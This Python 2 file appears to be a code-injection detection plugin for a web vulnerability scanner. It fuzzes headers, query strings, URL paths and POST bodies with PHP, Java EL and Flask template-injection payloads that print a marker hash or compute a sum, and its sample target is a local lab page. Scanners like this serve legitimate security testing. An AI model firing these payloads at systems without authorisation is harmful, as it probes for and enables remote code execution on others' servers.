#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from lib.common import *
from config import *
import urlparse
import urllib
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

def check(url, method, data, headers):
    return True

def check_vul(key, html):
    if key in html:
        return True
    return False

def get_payloads():
    payloads = [
        #PHP
        {
        'payload': ';print(md5(A_1_2_3));',
        'key': 'b8ad6ab1cc537de63b71b7bb75578b6d'
        },
        {
        'payload': "';print(md5(A_1_2_3));$a='",
        'key': 'b8ad6ab1cc537de63b71b7bb75578b6d'
        },
        {
        'payload': '";print(md5(A_1_2_3));$a="',
        'key': 'b8ad6ab1cc537de63b71b7bb75578b6d'
        },
        {
        'payload': '${@print_r(md5(A_1_2_3))};',
        'key': 'b8ad6ab1cc537de63b71b7bb75578b6d'
        },
        #JAVA EL
        {
        'payload': '${new java.lang.String(new byte[]{51,50,107,111,102,113,109,54,102,103})}',
        'key': '32kofqm6fg'
        },
        {
        'payload': '${961723833+31163473}',
        'key': '992887306'
        },
        #FLASK
        {
        'payload': '{{963723833+31265473}}',
        'key': '994989306'
        },
        #MISC
        {
        'payload': '863723833+31265463',
        'key': '894989296'
        }
    ]
    return payloads
def path_payload(url, payload):
    results = []
    if 'print' not in payload:
        payload = payload.replace('+','%2b')
        url = urlparse.urlsplit(url)
        path = url.path
        if path.replace('/', '') == '':
            _ = '/' + payload + '/'
            _ = urlparse.urlunsplit((url.scheme,url.netloc,_,url.query,url.fragment))
            results.append(_)
        path = path.split('/')
        for i in range(len(path)):
            tmp = path[:]
            if tmp[i]:
                tmp[i] = payload
                _ = '/'.join(tmp)
                _ = urlparse.urlunsplit((url.scheme,url.netloc,_,url.query,url.fragment))
                results.append(_)
    return results
def run(url, method, data, headers, proxy_headers=None):
    try:
        VUL = False
        parsed_url = urlparse.urlparse(url)
        host = parsed_url.netloc
        query = parsed_url.query
        url = url.encode('utf-8')
        data = data.encode('utf-8')
        headers = get_headers(url, method, data, headers, proxy_headers)
        payloads = get_payloads()
        headers_fuzz = ['Host', 'Referer', 'User-Agent', 'X-Forwarded-For', 'Client-IP', 'X-Forwarded-Host', 'X-Real-IP']
        #====================================================================================
        if method == 'GET':
            for payload in payloads:
                key = payload.get('key')
                payload = payload.get('payload')
        #====================================================================================
                for h in headers_fuzz:
                    tmp_headers = dict(headers)
                    tmp_headers[h] = payload
                    code, head, html = http_request_get(url, headers=tmp_headers)
                    if check_vul(key, html):
                        VUL = '{0}\n\n{1}: {2}'.format(url, h, payload)
                        break
                if VUL:
                    return {'target':host, 'type':'Code Injection', 'info':VUL}
        #====================================================================================
                #urls = Pollution([payload]).payload_generator(url, append=False)
                query_dicts = Pollution(query, [payload,]).payload_generate()
                urls = []
                for d in query_dicts:
                    u = urlparse.urlunparse((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                    urls.append(u)
                paths = path_payload(url, payload)
                urls.extend(paths)
                for _url in urls:
                    code, head, html = http_request_get(_url, headers=headers)
                    if check_vul(key, html):
                        VUL = _url
                        break
                if VUL:
                    return {'target':host, 'type':'Code Injection', 'info':VUL}
        #====================================================================================
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                key = payload.get('key')
                payload = payload.get('payload')
        #====================================================================================
                for h in headers_fuzz:
                    tmp_headers = dict(headers)
                    tmp_headers[h] = payload
                    code, head, html = http_request_post(url, data, headers=tmp_headers)
                    if check_vul(key, html):
                        VUL = '{0}\n\n{1}\n\n{2}: {3}'.format(url, data, h, payload)
                        break
                if VUL:
                    return {'target':host, 'type':'Code Injection', 'info':VUL}
        #====================================================================================
                # urls = Pollution([payload]).payload_generator(url, append=False)
                query_dicts = Pollution(query, [payload,]).payload_generate()
                urls = []
                for d in query_dicts:
                    u = urlparse.urlunparse((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                    urls.append(u)

                paths = path_payload(url, payload)
                urls.extend(paths)
                for _url in urls:
                    code, head, html = http_request_post(_url, data, headers=headers)
                    if check_vul(key, html):
                        VUL = _url + '\n\n' + data
                        break
                if not VUL:
                    # datas = Pollution([payload]).payload_generator(data, append=False)
                    datas = Pollution(query, [payload]).payload_generator()
                    for _data in datas:
                        code, head, html = http_request_post(url, _data, headers=headers)
                        if check_vul(key, html):
                            VUL = url + '\n\n' + _data
                            break
                if VUL:
                    return {'target':host, 'type':'Code Injection', 'info':VUL}
    except Exception, e:
        pass


def verify(task):
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "code injection",
        "info" : "[code injection]",
    }

    url = task['url']
    headers = task['request_header']
    method = task['method']
    data = task['request_content'] if method == 'POST' else None

    result = run(url, method, data, headers)
    if result:
        message['method'] = method
        message['url'] = url
        message['param'] = result['info']
        save_to_databases(message)
    else:
        result = (False, {})
    return result

if __name__ == '__main__':
    task = {
        'url': 'http://127.0.0.1:8000/vulnerabilities/exec/',
        'request_header': {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://127.0.0.1:8000/vulnerabilities/exec/',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        'request_content': 'ip=127.0.0.1&Submit=Submit',
        'method': 'POST'
    }
